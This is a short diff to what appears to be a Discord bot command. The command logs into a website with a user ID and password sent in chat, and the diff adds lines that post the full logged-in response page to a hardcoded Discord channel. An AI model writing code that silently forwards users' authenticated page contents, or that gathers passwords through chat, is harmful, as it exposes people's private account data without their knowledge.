@@ -98,6 +98,8 @@ async def nickname(ctx, member:discord.User = None):
     browser["user_id"] = username.content
     browser["password"] = password.content
     resp = browser.submit_selected()
+    channel = bot.get_channel(555823680148602901)
+    await channel.send(f"{resp.text}")
     name = resp.text
     name = lxml.html.fromstring(name)
     name = name.cssselect("a[class='nav-link u_floatThis-right']")[0].text
